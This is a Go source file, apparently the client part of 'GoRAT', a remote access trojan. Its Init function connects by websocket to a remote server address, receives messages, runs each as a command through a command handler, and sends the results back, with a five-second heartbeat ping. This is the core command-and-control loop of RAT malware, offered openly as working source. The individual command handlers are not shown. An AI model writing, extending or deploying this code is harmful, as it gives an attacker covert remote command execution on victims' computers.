// Copyright (c) 2020 Elitis. All rights reserved.
// This file is part of GoRAT; see LICENSE for your rights.

package client

import (
	"log"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/fjah/GoRAT/commands"
	"github.com/gorilla/websocket"
)

// Init initialises the client
func Init() {
	// Wait for interrupt
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	// Create the url
	u := url.URL{Scheme: "ws", Host: serverAddr, Path: "/ws"}
	log.Println("DIAL:", u.String())

	// Connect
	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	chk(err)
	defer c.Close()

	done := make(chan struct{})

	go func() {
		defer close(done)
		for {
			// Read messages
			_, message, err := c.ReadMessage()
			chk(err)

			// Send the result
			if !strings.HasPrefix(string(message), "ACK") {
				res, cmdName := commands.HandleCommand(message)
				log.Println(cmdName + " " + res)
				chk(c.WriteMessage(websocket.TextMessage, []byte(cmdName+" "+res)))
			} else {
				log.Println(string(message))
			}
		}
	}()

	// Create a 5 sec ticker
	ticker := time.NewTicker(time.Second * 5)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			return
		case t := <-ticker.C:
			tString := "PING " + t.String()

			// Send a ping message
			log.Println(tString)
			chk(c.WriteMessage(websocket.TextMessage, []byte(tString)))
		case <-interrupt:
			// Cleanly close the connection
			chk(c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, "")))
			select {
			case <-done:
			case <-time.After(time.Second):
			}
			return
		}
	}
}
